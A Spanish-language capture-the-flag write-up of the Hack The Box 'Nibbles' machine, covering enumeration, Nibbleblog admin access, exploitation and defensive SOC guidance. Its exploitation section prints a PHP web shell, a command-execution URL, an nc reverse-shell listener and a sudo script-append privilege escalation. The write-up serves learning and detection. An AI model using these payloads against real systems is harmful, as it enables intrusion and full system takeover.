# HTB - Nibbles

---

## Recopilación de información

<aside>
💡

### Fase de enumeración

Se inicia el reconocimiento identificando la máquina objetivo dentro de la red. Una vez localizada, se realiza un escaneo completo de puertos para identificar servicios expuestos.

El escaneo revela dos puertos abiertos:

* **22 (SSH)**
* **80 (HTTP)**

El servicio web se convierte en el principal vector de ataque, por lo que se prioriza su análisis.

</aside>

---

### Comandos de enumeración

```bash id="enum01"
sudo nmap -p- -sS --min-rate 5000 -n -Pn IP -oN puertos.txt
```

```bash id="enum02"
sudo nmap -p22,80 -sCV IP -oN servicios.txt
```

---

## Análisis del servicio web

<aside>
💡

Al acceder al puerto 80, se observa una página web aparentemente simple. Sin embargo, mediante análisis manual y enumeración de rutas, se detecta la presencia de un panel administrativo oculto.

</aside>

### Enumeración web

```bash id="web01"
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Rutas relevantes encontradas:

```text id="web02"
/nibbleblog
/admin.php
```

---

## Identificación de tecnología

<aside>
💡

Se identifica que la aplicación utiliza **Nibbleblog**, un CMS ligero en PHP.

La versión detectada presenta vulnerabilidades conocidas, especialmente relacionadas con subida de archivos.

</aside>

```bash id="web03"
whatweb http://IP/nibbleblog
```

---

## Explotación

### Acceso al panel admin

<aside>
💡

Se accede al panel administrativo (`/admin.php`). Tras intentos básicos, se logra acceso con credenciales débiles o previamente conocidas en el laboratorio.

</aside>

---

### Subida de archivo malicioso

<aside>
💡

Se detecta que el CMS permite subir archivos a través de plugins, lo que posibilita una vulnerabilidad de **file upload**.

Se aprovecha esta funcionalidad para subir una web shell en PHP.

</aside>

```bash id="expl01"
nano shell.php
```

```php id="expl02"
<?php system($_GET['cmd']); ?>
```

---

### Ejecución remota de comandos

Se accede al archivo subido:

```text id="expl03"
http://IP/nibbleblog/content/private/plugins/my_image/shell.php?cmd=id
```

---

## Acceso remoto

```bash id="expl04"
nc -lvnp 4444
```

Se establece una **reverse shell**, obteniendo acceso al sistema.

---

## Post-explotación

```bash id="post01"
whoami
```

```bash id="post02"
uname -a
```

Se identifica el usuario inicial y el entorno del sistema.

---

## Escalada de privilegios

<aside>
💡

Se enumeran permisos sudo:

</aside>

```bash id="priv01"
sudo -l
```

Se detecta que el usuario puede ejecutar un script con privilegios elevados.

Se modifica el script para ejecutar comandos como root.

```bash id="priv02"
echo "/bin/bash" >> script.sh
sudo script.sh
```

Resultado:

```text id="priv03"
root
```

---

## Análisis del ataque (ofensivo)

Cadena de ataque:

1. Enumeración de servicios
2. Descubrimiento de CMS vulnerable
3. Acceso al panel admin
4. Subida de archivo malicioso
5. Ejecución remota de comandos
6. Reverse shell
7. Escalada de privilegios

---

## Enfoque SOC (detección)

<aside>
💡

Este tipo de ataque es muy común en entornos web mal configurados y es altamente detectable.

</aside>

### Indicadores de compromiso (IoC)

* Accesos a rutas no indexadas (`/admin.php`)
* Subidas de archivos sospechosos
* Ejecución de comandos vía HTTP
* Conexiones salientes anómalas (reverse shell)
* Actividad sudo sospechosa

---

### Logs relevantes

* **Web server logs (Apache/Nginx)**
* **Auth logs (/var/log/auth.log)**
* **Logs de aplicaciones web**
* **SIEM correlación de eventos HTTP + sistema**

---

### Detección en entorno real

* Alertas por subida de archivos ejecutables
* Detección de web shells
* Análisis de tráfico HTTP anómalo
* Monitorización de conexiones salientes

---

## Enfoque SOC (mitigación y prevención)

<aside>
💡

La vulnerabilidad principal es una mala validación en subida de archivos.

</aside>

### Medidas técnicas

* Validar tipos de archivo en uploads
* Bloquear ejecución de PHP en directorios de subida
* Aplicar control de permisos
* Actualizar CMS
* Deshabilitar plugins innecesarios

---

### Medidas de detección

* WAF con reglas para file upload
* EDR para detectar ejecución de comandos
* SIEM con correlación de eventos web + sistema

---

### Medidas organizativas

* Auditorías de aplicaciones web
* Revisión de configuraciones inseguras
* Formación en desarrollo seguro

---

## Impacto real

<aside>
💡

Este tipo de vulnerabilidad permite:

* Ejecución remota de código
* Acceso persistente al sistema
* Escalada a root
* Movimiento lateral

</aside>

---

## Conclusión

<aside>
💡

El laboratorio demuestra cómo una vulnerabilidad aparentemente simple (file upload) puede derivar en un compromiso total del sistema.

Desde una perspectiva defensiva, resalta la importancia de:

* Validación de entradas
* Control de ejecución de archivos
* Monitorización de actividad web

</aside>

---
